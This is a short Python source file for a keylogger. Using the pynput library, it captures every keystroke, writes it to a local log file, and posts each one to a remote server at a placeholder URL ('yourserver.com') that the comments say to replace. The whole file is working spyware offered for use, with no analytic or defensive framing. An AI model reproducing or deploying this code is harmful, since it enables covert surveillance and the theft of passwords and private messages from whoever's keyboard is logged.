from pynput.keyboard import Key, Listener
import logging
import requests

# Local log file configuration
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Remote server URL to send logs (replace with your server's URL)
server_url = "http://yourserver.com/keylog"  # Replace this with the actual URL of your server


# Function to send key logs to a remote server
def send_to_server(data):
    try:
        requests.post(server_url, data={'key': data})
    except requests.RequestException as e:
        logging.error(f"Failed to send data to server: {e}")


# Function to log the keys pressed locally and send to the server
def on_press(key):
    try:
        # Log regular alphanumeric keys
        log_entry = f"Key pressed: {key.char}"
    except AttributeError:
        # Handle special keys (shift, enter, etc.)
        log_entry = f"Special key pressed: {key}"

    # Log locally
    logging.info(log_entry)

    # Send to server
    send_to_server(log_entry)
# Function to stop logging when the escape key is pressed
def on_release(key):
    if key == Key.esc:
        # Stop the listener
        return False

# Start listening to keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()